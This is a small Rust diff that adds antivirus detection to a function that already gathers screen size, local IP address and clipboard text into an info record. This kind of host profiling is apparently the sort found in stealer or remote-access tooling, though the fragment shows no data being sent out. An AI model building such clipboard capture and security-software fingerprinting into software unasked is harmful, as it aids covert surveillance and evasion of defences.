@@ -176,4 +176,7 @@ pub fn fill(info: &mut Info) {
     info.screen_size = screen_size();
     info.ip_address = local_ip();
     info.clipboard = clipboard_text();
+    if let Some(av) = crate::av::detect() {
+        info.anti_virus = av;
+    }
 }
